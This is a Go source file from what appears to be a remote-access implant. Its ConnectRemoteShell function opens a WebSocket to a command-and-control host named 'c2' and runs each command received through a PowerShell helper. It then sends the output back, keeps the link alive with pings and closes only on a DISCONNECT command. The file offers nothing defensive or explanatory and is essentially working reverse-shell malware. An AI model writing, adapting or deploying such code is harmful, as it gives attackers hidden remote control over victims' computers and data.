package core

import (
	"io"
	"net/http"
	"net/url"
	"time"

	"github.com/gorilla/websocket"
)

var (
	message string
	lasts   string
)

func ConnectRemoteShell(c2 string) {
	url := url.URL{Scheme: "ws", Host: c2, Path: "/hello"}
	dialer := websocket.Dialer{
		Proxy:            http.ProxyFromEnvironment,
		HandshakeTimeout: 45 * time.Second,
		ReadBufferSize:   1024,
		WriteBufferSize:  1024,
	}
	//fmt.Printf("[DEBUG]url: %s\n", url.String())
	client, _, err := dialer.Dial(url.String(), nil)
	if err != nil {
		//fmt.Printf("[ERROR]new client: %s\n", err.Error())
		return
	}
	defer client.Close()
	readDone := make(chan struct{})
	go func() {
		defer close(readDone)
		for {
			tp, data, err := client.ReadMessage()
			if err != nil {
				if err == io.EOF {
					//fmt.Println("read message from server: EOF\n")
				} else {
					//fmt.Printf("read message: %s\n", err.Error())
				}
				break
			}
			if tp == websocket.TextMessage {
				if string(data) != "pong" {
					if string(data) == "DISCONNECT" {
						if err := client.WriteMessage(websocket.CloseMessage, websocket.FormatCloseMessage(websocket.CloseNormalClosure, "")); err != nil {
							//fmt.Printf("send closure message to server: %s\n", err.Error())
						}
					} else {
						//fmt.Printf("message from server: %s\n", string(data))
						message = IssuePowershell(string(data))
					}
				}
			}
		}
	}()

	ticker := time.NewTicker(time.Second * 1)
	defer ticker.Stop()
	for {
		select {
		case <-readDone:
			return
		case <-ticker.C:
			if len(message) > 1 && lasts != message {
				lasts = message
				msg := []byte(message)
				if err := client.WriteMessage(websocket.TextMessage, msg); err != nil {
					//fmt.Printf("send message to server: %s\n", err.Error())
					return
				}
			} else {
				msg := []byte("ping")
				if err := client.WriteMessage(websocket.TextMessage, msg); err != nil {
					//fmt.Printf("send message to server: %s\n", err.Error())
					return
				}
			}
		}
	}
}
